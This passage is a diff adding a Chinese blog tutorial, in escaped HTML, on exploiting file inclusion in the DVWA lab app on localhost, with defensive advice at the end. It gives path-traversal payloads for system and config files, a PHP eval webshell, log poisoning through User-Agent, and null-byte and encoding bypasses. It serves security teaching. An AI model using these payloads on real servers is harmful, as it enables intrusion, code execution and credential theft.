class=&#34;hljs-symbol&#34;&gt;:/usr/sbin&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:/usr/sbin/nologin&lt;/span&gt;&lt;br&gt;...&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;适用场景&#34;&gt;&lt;a href=&#34;#适用场景&#34; class=&#34;headerlink&#34; title=&#34;适用场景&#34;&gt;&lt;/a&gt;适用场景&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;服务器未配置 &lt;code&gt;open_basedir&lt;/code&gt; 限制。&lt;/li&gt;
+&lt;li&gt;需要泄露系统配置或用户信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-读取源码文件&#34;&gt;&lt;a href=&#34;#2-读取源码文件&#34; class=&#34;headerlink&#34; title=&#34;2. 读取源码文件&#34;&gt;&lt;/a&gt;2. 读取源码文件&lt;/h3&gt;&lt;h4 id=&#34;步骤-1&#34;&gt;&lt;a href=&#34;#步骤-1&#34; class=&#34;headerlink&#34; title=&#34;步骤&#34;&gt;&lt;/a&gt;步骤&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;构造 Payload&lt;/strong&gt;：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=..&lt;span class=&#34;hljs-regexp&#34;&gt;/../&lt;/span&gt;config/config.inc.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;返回 &lt;code&gt;config.inc.php&lt;/code&gt; 的内容，可能包含数据库凭据：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_user&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_password&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;your_password&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;适用场景-1&#34;&gt;&lt;a href=&#34;#适用场景-1&#34; class=&#34;headerlink&#34; title=&#34;适用场景&#34;&gt;&lt;/a&gt;适用场景&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;获取应用配置文件，提取敏感信息（如数据库密码）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-LFI-结合文件上传实现-RCE&#34;&gt;&lt;a href=&#34;#3-LFI-结合文件上传实现-RCE&#34; class=&#34;headerlink&#34; title=&#34;3. LFI 结合文件上传实现 RCE&#34;&gt;&lt;/a&gt;3. LFI 结合文件上传实现 RCE&lt;/h3&gt;&lt;h4 id=&#34;步骤-2&#34;&gt;&lt;a href=&#34;#步骤-2&#34; class=&#34;headerlink&#34; title=&#34;步骤&#34;&gt;&lt;/a&gt;步骤&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;搭建上传环境&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;创建上传脚本（参考前文）：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Uploads/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;上传成功：Uploads/&amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&amp;lt;form method=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; enctype=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt;&amp;gt;&lt;br&gt;    &amp;lt;input type=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt; name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;&amp;gt;&lt;br&gt;    &amp;lt;input type=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;保存为 &lt;code&gt;/var/www/html/dvwa/upload.php&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;上传 WebShell&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;创建 &lt;code&gt;shell.txt&lt;/code&gt;：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;?php @eval(\$_POST[&amp;#x27;cmd&amp;#x27;]); ?&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; shell.txt&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;使用 Burp Suite 上传至 &lt;code&gt;/Uploads/shell.txt&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;包含执行&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;访问：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=Uploads/shell.txt&amp;amp;cmd=system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：返回命令执行结果：&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;uid&lt;/span&gt;=33(www-data) &lt;span class=&#34;hljs-attribute&#34;&gt;gid&lt;/span&gt;=33(www-data)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;连接蚁剑&#34;&gt;&lt;a href=&#34;#连接蚁剑&#34; class=&#34;headerlink&#34; title=&#34;连接蚁剑&#34;&gt;&lt;/a&gt;连接蚁剑&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;配置&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://localhost/dvwa/vulnerabilities/fi/?page=Uploads/shell.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;cmd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：命令执行、文件管理、反弹 Shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-日志包含（Log-Poisoning）&#34;&gt;&lt;a href=&#34;#4-日志包含（Log-Poisoning）&#34; class=&#34;headerlink&#34; title=&#34;4. 日志包含（Log Poisoning）&#34;&gt;&lt;/a&gt;4. 日志包含（Log Poisoning）&lt;/h3&gt;&lt;h4 id=&#34;步骤-3&#34;&gt;&lt;a href=&#34;#步骤-3&#34; class=&#34;headerlink&#34; title=&#34;步骤&#34;&gt;&lt;/a&gt;步骤&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;注入日志&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;发送请求，注入 User-Agent：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;GET / HTTP/&lt;span class=&#34;hljs-number&#34;&gt;1.1&lt;/span&gt;&lt;br&gt;Host: localhost&lt;br&gt;User-Agent: &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;Nginx 日志（&lt;code&gt;/var/log/nginx/access.log&lt;/code&gt;）记录：&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;language-php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;language-xml&#34;&gt;&amp;quot; - -&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;包含日志&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;访问：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;access.log&amp;amp;cmd=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：返回 &lt;code&gt;www-data&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;适用场景-2&#34;&gt;&lt;a href=&#34;#适用场景-2&#34; class=&#34;headerlink&#34; title=&#34;适用场景&#34;&gt;&lt;/a&gt;适用场景&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;WAF 未过滤 User-Agent。&lt;/li&gt;
+&lt;li&gt;日志文件路径可访问。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、绕过技巧&#34;&gt;&lt;a href=&#34;#五、绕过技巧&#34; class=&#34;headerlink&#34; title=&#34;五、绕过技巧&#34;&gt;&lt;/a&gt;五、绕过技巧&lt;/h2&gt;&lt;h3 id=&#34;1-Null-字节注入&#34;&gt;&lt;a href=&#34;#1-Null-字节注入&#34; class=&#34;headerlink&#34; title=&#34;1. Null 字节注入&#34;&gt;&lt;/a&gt;1. Null 字节注入&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;适用版本&lt;/strong&gt;：PHP &amp;lt; 5.3.4（低版本存在 Null 字节截断漏洞）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Payload&lt;/strong&gt;：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=..&lt;span class=&#34;hljs-regexp&#34;&gt;/../&lt;/span&gt;shell.php%&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;效果&lt;/strong&gt;：截断后缀检查，包含 &lt;code&gt;shell.php&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-编码绕过&#34;&gt;&lt;a href=&#34;#2-编码绕过&#34; class=&#34;headerlink&#34; title=&#34;2. 编码绕过&#34;&gt;&lt;/a&gt;2. 编码绕过&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL 编码&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../&lt;/code&gt; -&amp;gt; &lt;code&gt;..%2f&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/passwd&lt;/code&gt; -&amp;gt; &lt;code&gt;%2fetc%2fpasswd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;双重编码&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../&lt;/code&gt; -&amp;gt; &lt;code&gt;..%252f&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Base64 编码&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-日志包含&#34;&gt;&lt;a href=&#34;#3-日志包含&#34; class=&#34;headerlink&#34; title=&#34;3. 日志包含&#34;&gt;&lt;/a&gt;3. 日志包含&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;注入 HTTP 头（如 User-Agent、Referer）：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;User-Agent: &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;包含日志文件：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;access.log&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-上传文件绕过&#34;&gt;&lt;a href=&#34;#4-上传文件绕过&#34; class=&#34;headerlink&#34; title=&#34;4. 上传文件绕过&#34;&gt;&lt;/a&gt;4. 上传文件绕过&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;伪装后缀&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;上传 &lt;code&gt;shell.php.jpg&lt;/code&gt; 或 &lt;code&gt;shell.txt&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;包含：&lt;code&gt;page=Uploads/shell.php.jpg&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;MIME 类型伪造&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;修改 Content-Type 为 &lt;code&gt;image/jpeg&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、防御建议&#34;&gt;&lt;a href=&#34;#六、防御建议&#34; class=&#34;headerlink&#34; title=&#34;六、防御建议&#34;&gt;&lt;/a&gt;六、防御建议&lt;/h2&gt;&lt;h3 id=&#34;1-开发层&#34;&gt;&lt;a href=&#34;#1-开发层&#34; class=&#34;headerlink&#34; title=&#34;1. 开发层&#34;&gt;&lt;/a&gt;1. 开发层&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;白名单机制&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$whitelist&lt;/span&gt; = [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;home&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;about&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;contact&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$page&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;] ?? &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;home&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$page&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$whitelist&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pages/&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$page&amp;#125;&lt;/span&gt;.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pages/404.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;路径验证&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$page&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;]);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/^[a-zA-Z0-9_]+\.php$/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$page&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span 